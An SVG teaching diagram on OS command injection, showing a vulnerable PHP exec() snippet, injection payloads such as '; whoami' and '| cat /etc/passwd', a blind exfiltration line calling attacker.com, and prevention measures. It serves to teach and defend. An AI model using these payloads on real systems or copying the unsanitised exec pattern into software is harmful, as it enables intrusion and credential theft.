<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <defs>
    <linearGradient id="grad-accent" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e88e5"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>
    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f2f2f2"/>
    </linearGradient>
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-accent" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
  </defs>
  <rect width="1280" height="720" fill="#ffffff"/>

  <!-- Flow: User input -> Web App -> Shell -> OS -->

  <!-- Step 1: Attacker input -->
  <rect x="30" y="60" width="210" height="130" rx="10" fill="#fce4ec" filter="url(#shadow)" stroke="#c62828" stroke-width="2"/>
  <text x="135" y="90" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#c62828" text-anchor="middle">Attacker Input</text>
  <text x="50" y="116" font-family="monospace" font-size="12" fill="#555">127.0.0.1; whoami</text>
  <text x="50" y="136" font-family="monospace" font-size="12" fill="#555">| cat /etc/passwd</text>
  <text x="50" y="156" font-family="monospace" font-size="12" fill="#555">&amp;&amp; id</text>
  <text x="50" y="178" font-family="monospace" font-size="12" fill="#555">`ls -la`</text>

  <line x1="240" y1="125" x2="310" y2="125" stroke="#c62828" stroke-width="2.5" marker-end="url(#arrow)"/>
  <text x="275" y="115" font-family="Arial,sans-serif" font-size="11" fill="#c62828" text-anchor="middle">HTTP GET/POST</text>

  <!-- Step 2: Web App -->
  <rect x="310" y="50" width="270" height="170" rx="10" fill="#fff8e1" filter="url(#shadow)" stroke="#f9a825" stroke-width="2"/>
  <rect x="310" y="50" width="270" height="36" rx="10" fill="#f9a825"/>
  <rect x="310" y="74" width="270" height="12" fill="#f9a825"/>
  <text x="445" y="73" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#fff" text-anchor="middle">Web Application</text>
  <text x="330" y="106" font-family="monospace" font-size="11" fill="#555">$host = $_GET['host'];</text>
  <text x="330" y="124" font-family="monospace" font-size="11" fill="#555">$cmd = "ping -c 1 " . $host;</text>
  <text x="330" y="142" font-family="monospace" font-size="11" fill="#c62828">exec($cmd, $output);</text>
  <text x="330" y="165" font-family="Arial,sans-serif" font-size="12" fill="#555">No sanitisation!</text>
  <text x="330" y="183" font-family="Arial,sans-serif" font-size="12" fill="#555">Unsanitised input → shell string</text>

  <line x1="580" y1="135" x2="650" y2="135" stroke="#555" stroke-width="2.5" marker-end="url(#arrow)"/>
  <text x="615" y="125" font-family="Arial,sans-serif" font-size="11" fill="#555" text-anchor="middle">shell call</text>

  <!-- Step 3: Shell Execution -->
  <rect x="650" y="60" width="320" height="170" rx="10" fill="#e8f5e9" filter="url(#shadow)" stroke="#2e7d32" stroke-width="2"/>
  <rect x="650" y="60" width="320" height="36" rx="10" fill="#2e7d32"/>
  <rect x="650" y="84" width="320" height="12" fill="#2e7d32"/>
  <text x="810" y="83" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#fff" text-anchor="middle">Shell (/bin/sh)</text>
  <text x="670" y="118" font-family="monospace" font-size="12" fill="#333">$ ping -c 1 127.0.0.1; whoami</text>
  <text x="670" y="142" font-family="Arial,sans-serif" font-size="12" fill="#555">Parsed as TWO commands:</text>
  <text x="670" y="162" font-family="monospace" font-size="12" fill="#2e7d32">  ping -c 1 127.0.0.1</text>
  <text x="670" y="180" font-family="monospace" font-size="12" fill="#c62828">  whoami              ← injected!</text>
  <text x="670" y="216" font-family="Arial,sans-serif" font-size="11" fill="#555">Runs as web server user (www-data/apache)</text>

  <line x1="970" y1="145" x2="1040" y2="145" stroke="#c62828" stroke-width="2.5" marker-end="url(#arrow)"/>
  <text x="1005" y="135" font-family="Arial,sans-serif" font-size="11" fill="#c62828" text-anchor="middle">syscall</text>

  <!-- Step 4: OS Command -->
  <rect x="1040" y="80" width="210" height="110" rx="10" fill="#fce4ec" filter="url(#shadow)" stroke="#c62828" stroke-width="2"/>
  <text x="1145" y="113" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#c62828" text-anchor="middle">OS</text>
  <text x="1145" y="135" font-family="monospace" font-size="13" fill="#c62828" text-anchor="middle">www-data</text>
  <text x="1145" y="157" font-family="Arial,sans-serif" font-size="12" fill="#555" text-anchor="middle">output returned</text>
  <text x="1145" y="175" font-family="Arial,sans-serif" font-size="12" fill="#555" text-anchor="middle">to attacker</text>

  <!-- Metacharacters box -->
  <rect x="30" y="250" width="590" height="200" rx="10" fill="#f5f5f5" filter="url(#shadow)" stroke="#e0e0e0" stroke-width="1"/>
  <text x="325" y="278" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#c62828" text-anchor="middle">Shell Metacharacters Used in Injection</text>

  <rect x="50" y="290" width="555" height="28" rx="4" fill="#eceff1"/>
  <text x="80" y="309" font-family="monospace" font-size="13" fill="#c62828" font-weight="bold">;</text>
  <text x="115" y="309" font-family="Arial,sans-serif" font-size="13" fill="#333">Command separator — always runs next command</text>

  <rect x="50" y="322" width="555" height="28" rx="4" fill="#fce4ec"/>
  <text x="80" y="341" font-family="monospace" font-size="13" fill="#c62828" font-weight="bold">|</text>
  <text x="115" y="341" font-family="Arial,sans-serif" font-size="13" fill="#333">Pipe — stdout of cmd1 becomes stdin of cmd2</text>

  <rect x="50" y="354" width="555" height="28" rx="4" fill="#eceff1"/>
  <text x="80" y="373" font-family="monospace" font-size="13" fill="#c62828" font-weight="bold">&amp;&amp;</text>
  <text x="115" y="373" font-family="Arial,sans-serif" font-size="13" fill="#333">AND — cmd2 only if cmd1 succeeds (exit 0)</text>

  <rect x="50" y="386" width="555" height="28" rx="4" fill="#fce4ec"/>
  <text x="80" y="405" font-family="monospace" font-size="13" fill="#c62828" font-weight="bold">||</text>
  <text x="115" y="405" font-family="Arial,sans-serif" font-size="13" fill="#333">OR — cmd2 only if cmd1 fails</text>

  <rect x="50" y="418" width="555" height="28" rx="4" fill="#eceff1"/>
  <text x="80" y="437" font-family="monospace" font-size="13" fill="#c62828" font-weight="bold">` `  or $( )</text>
  <text x="165" y="437" font-family="Arial,sans-serif" font-size="13" fill="#333">Backticks / subshell — command substitution</text>

  <!-- Blind vs Visible panel -->
  <rect x="650" y="250" width="600" height="200" rx="10" fill="#f5f5f5" filter="url(#shadow)" stroke="#e0e0e0" stroke-width="1"/>
  <text x="950" y="278" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#333" text-anchor="middle">Blind vs Visible Injection</text>

  <rect x="670" y="290" width="260" height="145" rx="7" fill="#e3f2fd" stroke="#1565c0" stroke-width="1"/>
  <text x="800" y="313" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#1565c0" text-anchor="middle">Visible (In-Band)</text>
  <text x="690" y="335" font-family="Arial,sans-serif" font-size="12" fill="#333">Output appears in response</text>
  <text x="690" y="355" font-family="monospace" font-size="11" fill="#555">; cat /etc/passwd</text>
  <text x="690" y="375" font-family="Arial,sans-serif" font-size="12" fill="#555">Response contains file content</text>
  <text x="690" y="395" font-family="Arial,sans-serif" font-size="12" fill="#555">Easiest to exploit</text>
  <text x="690" y="415" font-family="Arial,sans-serif" font-size="12" fill="#555">Confirm with: echo 1234567890</text>

  <rect x="970" y="290" width="260" height="145" rx="7" fill="#fce4ec" stroke="#c62828" stroke-width="1"/>
  <text x="1100" y="313" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#c62828" text-anchor="middle">Blind (Out-of-Band)</text>
  <text x="990" y="335" font-family="Arial,sans-serif" font-size="12" fill="#333">No output in response</text>
  <text x="990" y="355" font-family="monospace" font-size="11" fill="#555">; sleep 5</text>
  <text x="990" y="375" font-family="Arial,sans-serif" font-size="12" fill="#555">Time-based detection</text>
  <text x="990" y="395" font-family="monospace" font-size="11" fill="#555">; curl attacker.com/$(id)</text>
  <text x="990" y="415" font-family="Arial,sans-serif" font-size="12" fill="#555">DNS/HTTP out-of-band exfil</text>

  <!-- Prevention panel -->
  <rect x="30" y="480" width="1220" height="210" rx="10" fill="#e8f5e9" filter="url(#shadow)" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="640" y="508" font-family="Arial,sans-serif" font-size="16" font-weight="bold" fill="#2e7d32" text-anchor="middle">Prevention</text>

  <rect x="50" y="520" width="350" height="150" rx="7" fill="#fff" stroke="#a5d6a7" stroke-width="1"/>
  <text x="225" y="543" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Avoid shell execution</text>
  <text x="70" y="565" font-family="Arial,sans-serif" font-size="12" fill="#333">• Use language APIs not shell commands</text>
  <text x="70" y="585" font-family="monospace" font-size="11" fill="#555">subprocess.run(['ping','-c','1',host])</text>
  <text x="70" y="605" font-family="Arial,sans-serif" font-size="12" fill="#555">  (list form — no shell interpretation)</text>
  <text x="70" y="625" font-family="Arial,sans-serif" font-size="12" fill="#555">• Never pass user input to exec/system</text>
  <text x="70" y="645" font-family="Arial,sans-serif" font-size="12" fill="#555">• Use whitelists, not blacklists</text>
  <text x="70" y="663" font-family="Arial,sans-serif" font-size="12" fill="#555">• Reject inputs not matching regex pattern</text>

  <rect x="430" y="520" width="380" height="150" rx="7" fill="#fff" stroke="#a5d6a7" stroke-width="1"/>
  <text x="620" y="543" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Sanitise if shell is unavoidable</text>
  <text x="450" y="565" font-family="monospace" font-size="11" fill="#555">escapeshellarg($input)   # PHP</text>
  <text x="450" y="585" font-family="monospace" font-size="11" fill="#555">shlex.quote(input)       # Python</text>
  <text x="450" y="605" font-family="Arial,sans-serif" font-size="12" fill="#555">• Wrap input in single quotes</text>
  <text x="450" y="625" font-family="Arial,sans-serif" font-size="12" fill="#555">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
  <text x="450" y="645" font-family="Arial,sans-serif" font-size="12" fill="#555">• Drop non-alphanumeric chars</text>

  <rect x="840" y="520" width="390" height="150" rx="7" fill="#fff" stroke="#a5d6a7" stroke-width="1"/>
  <text x="1035" y="543" font-family="Arial,sans-serif" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Defence-in-depth</text>
  <text x="860" y="565" font-family="Arial,sans-serif" font-size="12" fill="#333">• Run web server as low-privilege user</text>
  <text x="860" y="585" font-family="Arial,sans-serif" font-size="12" fill="#333">• Use WAF rules to block metacharacters</text>
  <text x="860" y="605" font-family="Arial,sans-serif" font-size="12" fill="#333">• AppArmor / SELinux mandatory access</text>
  <text x="860" y="625" font-family="Arial,sans-serif" font-size="12" fill="#333">• Containers: restrict /bin and /usr/bin</text>
  <text x="860" y="645" font-family="Arial,sans-serif" font-size="12" fill="#333">• Log all exec() / system() calls</text>
</svg>
